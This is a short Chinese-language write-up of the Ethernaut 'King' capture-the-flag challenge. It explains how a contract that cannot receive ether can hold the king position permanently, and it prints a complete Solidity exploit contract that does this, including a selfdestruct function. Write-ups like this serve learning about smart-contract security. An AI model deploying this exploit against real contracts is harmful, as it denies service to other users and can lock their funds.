Level10 - King

这个题的目的成为国王并且不能被人”替换掉“，成为国王很简单，只要向contract.address发送contract.prize个ether就可以成为国王，但是别人同样也可以这样操作，如果不想被”赶下台“需要让transfer失败，也就无法执行下面的操作，这个可以通过合约实现，让合约地址成为国王，并且不定义fallback方法（或定义fallback payable方法，该方法直接throw）。

```js
pragma solidity ^0.4.24;

contract King {
  address public king;
  uint public prize;
  function() external payable;
}

contract KingExploits {
    address owner;

    constructor (address _c) payable public {
        owner = msg.sender;
        King c = King(_c);
        require(address(c).call.value(c.prize())());
    }

    function terminator() public {
        selfdestruct(owner);
    }

    /* 
    function() public payable {
        revert();
    }
    */
}
```

> 在合约被销毁之前就可以永远霸占王位了，但是一旦合约销毁，合约地址可以接受ether，退回的ether确永远无法取回了。

参考：

[Ethernaut King Problem](https://medium.com/coinmonks/ethernaut-king-problem-2ccec1ee4190)
[](_)